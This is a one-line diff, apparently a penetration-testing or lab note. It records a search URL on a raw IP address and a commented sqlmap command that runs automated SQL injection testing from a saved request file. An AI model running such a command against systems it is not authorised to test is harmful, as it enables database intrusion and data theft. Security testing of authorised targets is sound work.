@@ -1,0 +1,1 @@
+http://159.203.81.45:8000/joe.php?search=sfsadff (GET)  # /usr/bin/sqlmap -r search_reqt.txt
